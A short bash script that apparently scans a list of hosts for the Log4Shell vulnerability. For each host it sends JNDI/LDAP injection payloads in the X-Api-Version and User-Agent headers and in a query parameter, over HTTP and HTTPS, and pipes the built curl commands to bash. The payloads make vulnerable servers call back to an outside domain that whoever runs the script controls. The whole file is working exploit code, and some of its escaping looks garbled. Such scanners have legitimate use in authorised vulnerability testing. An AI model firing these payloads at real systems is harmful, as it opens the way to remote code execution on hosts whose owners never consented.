#!/bin/bash

while read fqdn
do
  echo "$fqdn"
  DNS_QUERY=log4shell.`echo "$fqdn" | sed -e "s|:.*$||g"`.$DOMAIN
  # http
  echo 'curl -s --max-time 3 http://$fqdn -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$DNS_QUERY/a}'|g" | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -s --max-time 3 '$fqdn/?test=log4jPayload' > /dev/null'     | sed "s|log4jPayload|'\$\\\{{jndi:ldap://$DNS_QUERY/a\\\}}'|g"        | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -s --max-time 3 $fqdn -H 'log4jPayload' > /dev/null'        | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$DNS_QUERY/a}'|g"    | sed "s|\$fqdn|$fqdn|g" | bash
  # https
  echo 'curl -s -k --max-time 3 https://$fqdn -H 'log4jPayload' > /dev/null' | sed "s|log4jPayload|'X-Api-Version: \${jndi:ldap://$DNS_QUERY/a}'|g" | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -s -k --max-time 3 '$fqdn/?test=log4jPayload' > /dev/null'      | sed "s|log4jPayload|'\$\\\{{jndi:ldap://$DNS_QUERY/a\\\}}'|g"        | sed "s|\$fqdn|$fqdn|g" | bash
  echo 'curl -s -k --max-time 3 $fqdn -H 'log4jPayload' > /dev/null'         | sed "s|log4jPayload|'User-Agent: \${jndi:ldap://$DNS_QUERY/a}'|g"    | sed "s|\$fqdn|$fqdn|g" | bash
done < fqdn.txt

